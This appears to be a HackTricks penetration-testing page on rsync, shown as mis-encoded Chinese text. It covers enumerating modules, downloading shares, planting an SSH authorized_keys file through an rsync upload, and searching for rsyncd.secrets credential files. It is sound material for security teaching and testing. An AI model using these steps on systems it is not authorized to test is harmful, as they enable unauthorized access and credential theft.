# 873 - æ¸—é€æµ‹è¯• Rsync

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## **åŸºæœ¬ä¿¡æ¯**

> **rsync** æ˜¯ä¸€ç§ç”¨äºåœ¨è®¡ç®—æœºå’Œå¤–éƒ¨ç¡¬ç›˜ä¹‹é—´ä»¥åŠè·¨ç½‘ç»œè®¡ç®—æœºä¹‹é—´é«˜æ•ˆåœ°[ä¼ è¾“](https://en.wikipedia.org/wiki/File\_transfer)å’Œ[åŒæ­¥](https://en.wikipedia.org/wiki/File\_synchronization)[æ–‡ä»¶](https://en.wikipedia.org/wiki/Computer\_file)çš„å®ç”¨å·¥å…·ï¼Œå®ƒé€šè¿‡æ¯”è¾ƒæ–‡ä»¶çš„[ä¿®æ”¹æ—¶é—´](https://en.wikipedia.org/wiki/Timestamping\_\(computing\))å’Œå¤§å°æ¥å®ç°ã€‚å®ƒé€šå¸¸åœ¨ç±»Unixçš„[æ“ä½œç³»ç»Ÿ](https://en.wikipedia.org/wiki/Operating\_system)ä¸­æ‰¾åˆ°ã€‚rsync ç®—æ³•æ˜¯ä¸€ç§[å¢é‡ç¼–ç ](https://en.wikipedia.org/wiki/Delta\_encoding)ç±»å‹ï¼Œç”¨äºæœ€å°åŒ–ç½‘ç»œä½¿ç”¨ã€‚å¯ä»¥ä½¿ç”¨[Zlib](https://en.wikipedia.org/wiki/Zlib)è¿›è¡Œé¢å¤–çš„[æ•°æ®å‹ç¼©](https://en.wikipedia.org/wiki/Data\_compression)ï¼Œ[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3)å¹¶ä¸”å¯ä»¥ä½¿ç”¨[SSH](https://en.wikipedia.org/wiki/Secure\_Shell)æˆ–[stunnel](https://en.wikipedia.org/wiki/Stunnel)è¿›è¡Œå®‰å…¨ä¼ è¾“ã€‚

æ¥è‡ª[wikipedia](https://en.wikipedia.org/wiki/Rsync)ã€‚

**é»˜è®¤ç«¯å£ï¼š** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## æšä¸¾

### æ¨ªå¹…å’Œæ‰‹åŠ¨é€šä¿¡

åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œæšä¸¾æ˜¯ä¸€é¡¹é‡è¦çš„ä»»åŠ¡ï¼Œå®ƒå¸®åŠ©æˆ‘ä»¬æ”¶é›†å…³äºç›®æ ‡ç³»ç»Ÿçš„ä¿¡æ¯ã€‚åœ¨è¿›è¡ŒrsyncæœåŠ¡çš„æ¸—é€æµ‹è¯•æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è¿›è¡Œæšä¸¾ã€‚

#### æ¨ªå¹…

é€šè¿‡è¿æ¥åˆ°ç›®æ ‡rsyncæœåŠ¡å¹¶è¯»å–æ¨ªå¹…ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥è·å–æœ‰å…³æœåŠ¡ç‰ˆæœ¬å’Œå…¶ä»–ç›¸å…³ä¿¡æ¯çš„çº¿ç´¢ã€‚è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨`telnet`å‘½ä»¤è¿æ¥åˆ°rsyncæœåŠ¡çš„é»˜è®¤ç«¯å£ï¼ˆ873ï¼‰æ¥å®Œæˆã€‚

```bash
telnet <target_ip> 873
```

#### æ‰‹åŠ¨é€šä¿¡

æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨`rsync`å‘½ä»¤ä¸ç›®æ ‡rsyncæœåŠ¡è¿›è¡Œæ‰‹åŠ¨é€šä¿¡ã€‚è¿™å¯ä»¥å¸®åŠ©æˆ‘ä»¬äº†è§£æœåŠ¡çš„åŠŸèƒ½å’Œé…ç½®ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„æ‰‹åŠ¨é€šä¿¡å‘½ä»¤ï¼š

- åˆ—å‡ºç›®æ ‡ç³»ç»Ÿä¸Šçš„æ–‡ä»¶å’Œç›®å½•ï¼š

```bash
rsync rsync://<target_ip>/
```

- ä¸‹è½½ç›®æ ‡ç³»ç»Ÿä¸Šçš„æ–‡ä»¶æˆ–ç›®å½•ï¼š

```bash
rsync -av rsync://<target_ip>/<file_or_directory> <local_destination>
```

- ä¸Šä¼ æœ¬åœ°æ–‡ä»¶æˆ–ç›®å½•åˆ°ç›®æ ‡ç³»ç»Ÿï¼š

```bash
rsync -av <local_file_or_directory> rsync://<target_ip>/<destination_directory>
```

é€šè¿‡ä½¿ç”¨è¿™äº›å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ç›®æ ‡rsyncæœåŠ¡è¿›è¡Œäº¤äº’ï¼Œå¹¶è·å–æœ‰å…³ç›®æ ‡ç³»ç»Ÿçš„æ›´å¤šä¿¡æ¯ã€‚
```
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **æšä¸¾å…±äº«æ–‡ä»¶å¤¹**

**ä¸€ä¸ª rsync æ¨¡å—æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç›®å½•å…±äº«**ã€‚è¿™äº›æ¨¡å—**å¯ä»¥é€‰æ‹©æ€§åœ°é€šè¿‡å¯†ç è¿›è¡Œä¿æŠ¤**ã€‚è¿™ä¸ªé€‰é¡¹åˆ—å‡ºäº†å¯ç”¨çš„æ¨¡å—ï¼Œå¹¶ä¸”å¯ä»¥é€‰æ‹©æ€§åœ°ç¡®å®šæ¨¡å—æ˜¯å¦éœ€è¦å¯†ç æ¥è®¿é—®\*\*:\*\*
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
è¯·æ³¨æ„ï¼Œå¯ä»¥é…ç½®ä¸€ä¸ªå…±äº«åç§°ä»¥ä½¿å…¶ä¸è¢«åˆ—å‡ºã€‚å› æ­¤å¯èƒ½æœ‰ä¸€äº›**éšè—çš„**ä¸œè¥¿ã€‚\
è¯·æ³¨æ„ï¼Œå¯èƒ½æœ‰ä¸€äº›åˆ—å‡ºçš„**å…±äº«åç§°**éœ€è¦ä¸€äº›ï¼ˆä¸åŒçš„ï¼‰**å‡­æ®**æ‰èƒ½è®¿é—®ã€‚å› æ­¤ï¼Œå¹¶ä¸æ€»æ˜¯æ‰€æœ‰åˆ—å‡ºçš„åç§°éƒ½å¯ä»¥è®¿é—®ï¼Œå¦‚æœæ‚¨åœ¨å°è¯•è®¿é—®å…¶ä¸­ä¸€äº›æ—¶æ”¶åˆ°**"è®¿é—®è¢«æ‹’ç»"**çš„æ¶ˆæ¯ï¼Œæ‚¨å°†ä¼šæ³¨æ„åˆ°è¿™ä¸€ç‚¹ã€‚

### [**æš´åŠ›ç ´è§£**](../generic-methodologies-and-resources/brute-force.md#rsync)

### æ‰‹åŠ¨ Rsync

ä¸€æ—¦æ‚¨è·å¾—äº†**æ¨¡å—åˆ—è¡¨**ï¼Œæ ¹æ®æ‚¨æƒ³è¦é‡‡å–çš„æ“ä½œä»¥åŠæ˜¯å¦éœ€è¦èº«ä»½éªŒè¯ï¼Œæ‚¨æœ‰å‡ ä¸ªä¸åŒçš„é€‰é¡¹ã€‚**å¦‚æœä¸éœ€è¦èº«ä»½éªŒè¯**ï¼Œæ‚¨å¯ä»¥**åˆ—å‡º**ä¸€ä¸ªå…±äº«æ–‡ä»¶å¤¹ï¼š
```bash
rsync -av --list-only rsync://192.168.0.123/shared_name
```
å¹¶é€šè¿‡ä»¥ä¸‹å‘½ä»¤å°†æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ°æœ¬åœ°æœºå™¨ï¼š
```bash
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
è¿™ä¸ªå‘½ä»¤ä¼š**é€’å½’åœ°å°†ç›®å½•** `<shared_name>` ä¸Šçš„æ‰€æœ‰æ–‡ä»¶ä»æœºå™¨ `<IP>` ä¼ è¾“åˆ°æœ¬åœ°æœºå™¨çš„ `./rsync_shared` ç›®å½•ä¸­ã€‚æ–‡ä»¶ä»¥â€œå½’æ¡£â€æ¨¡å¼ä¼ è¾“ï¼Œè¿™ç¡®ä¿äº†ç¬¦å·é“¾æ¥ã€è®¾å¤‡ã€å±æ€§ã€æƒé™ã€æ‰€æœ‰æƒç­‰åœ¨ä¼ è¾“ä¸­å¾—ä»¥ä¿ç•™ã€‚

å¦‚æœä½ **æœ‰å‡­æ®**ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼ˆå¯†ç å°†ä¼šæç¤ºï¼‰**åˆ—å‡º/ä¸‹è½½**ä¸€ä¸ª**å…±äº«åç§°**ï¼š
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨rsyncä¸Šä¼ ä¸€äº›å†…å®¹ï¼ˆä¾‹å¦‚ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ª_**authorized\_keys**_æ–‡ä»¶ä»¥è·å–å¯¹è¯¥æ¡†çš„è®¿é—®æƒé™ï¼‰ï¼š
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

æŸ¥æ‰¾rsyncdé…ç½®æ–‡ä»¶ï¼š
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œæœ‰æ—¶å¯ä»¥æ‰¾åˆ°å‚æ•°_secrets file = /path/to/file_ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¯èƒ½åŒ…å«å…è®¸ç”¨äºèº«ä»½éªŒè¯åˆ°rsyncdçš„ç”¨æˆ·åå’Œå¯†ç ã€‚

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
